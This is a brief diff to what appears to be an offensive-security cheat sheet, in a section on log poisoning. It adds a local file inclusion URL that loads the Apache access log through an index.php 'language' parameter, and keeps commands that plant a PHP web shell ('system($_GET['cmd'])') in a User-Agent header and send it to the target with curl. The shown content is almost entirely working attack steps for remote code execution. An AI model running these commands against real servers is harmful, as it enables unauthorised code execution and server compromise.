@@ -102,9 +102,11 @@ Log poisoning:
   dir:
     /var/log/apache2/
     C:\xampp\apache\logs\
-
+    
     /var/log/nginx/
     C:\nginx\log\
+
+  http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
 
   echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
   curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
